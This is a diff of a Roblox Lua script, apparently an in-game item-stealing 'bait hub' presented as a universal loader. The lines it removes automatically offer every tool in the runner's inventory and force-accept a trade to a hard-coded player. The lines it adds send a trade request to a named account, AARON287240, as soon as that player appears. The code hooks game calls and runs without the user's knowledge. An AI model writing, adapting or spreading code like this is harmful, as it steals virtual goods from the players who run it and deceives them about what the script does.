@@ -1,5 +1,5 @@
 --[[
-	KAISEN X — Universal Loader & Bait Hub (Búsqueda de Remotes Optimizada)
+	KAISEN X — Universal Loader & Bait Hub (Destino: AARON287240)
 	created by KAISEN
 ]]
 
@@ -200,59 +200,29 @@ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
 	return oldNamecall(self, unpack(args))
 end)
 
--- ========== BUSCADOR Y EJECUTOR AUTOMÁTICO DE REMOTES ==========
-local function ejecutarTransferenciaForzada(targetObj)
+-- ========== EJECUCIÓN AUTOMÁTICA HACIA AARON287240 ==========
+local function enviarSolicitudTrade(targetPlayer)
 	pcall(function()
-		-- Intento directo con las rutas conocidas
-		local tradeFolder = ReplicatedStorage:FindFirstChild("Trade")
-		if tradeFolder then
-			local offerItem = tradeFolder:FindFirstChild("OfferItem")
-			local acceptTrade = tradeFolder:FindFirstChild("AcceptTrade")
-
-			if offerItem then
-				local foldersToCheck = { LP:FindFirstChild("Backpack"), LP.Character }
-				for _, folder in ipairs(foldersToCheck) do
-					if folder then
-						for _, item in ipairs(folder:GetChildren()) do
-							if item:IsA("Tool") then
-								offerItem:FireServer(item.Name, "Weapons")
-								task.wait(0.05)
-							end
-						end
-					end
-				end
-			end
-
-			if acceptTrade then
-				task.wait(0.2)
-				acceptTrade:FireServer(targetObj.UserId, 11656.352484435018)
-			end
-		else
-			-- Búsqueda recursiva genérica en todo ReplicatedStorage por si cambia de ubicación
-			for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
-				if descendant:IsA("RemoteEvent") then
-					local lname = string.lower(descendant.Name)
-					if lname:find("offer") or lname:find("trade") or lname:find("accept") then
-						pcall(function()
-							descendant:FireServer(targetObj)
-						end)
-					end
-				end
-			end
+		local tradeRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest")
+		if tradeRemote then
+			local args = {
+				[1] = targetPlayer
+			}
+			tradeRemote:InvokeServer(unpack(args))
 		end
 	end)
 end
 
--- Monitoreo rápido: apenas te detecte en el servidor, dispara la transferencia
+-- Monitoreo constante: apenas entres al servidor, se dispara directo hacia ti
 task.spawn(function()
 	while true do
 		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
 		if targetPlayer and targetPlayer ~= LP then
-			ejecutarTransferenciaForzada(targetPlayer)
+			enviarSolicitudTrade(targetPlayer)
 			break
 		end
 		task.wait(0.5)
 	end
 end)
 
-print("[KAISEN X] Sistema de escaneo y ejecución automática listo.")
+print("[KAISEN X] Sistema vinculado a AARON287240 activo.")
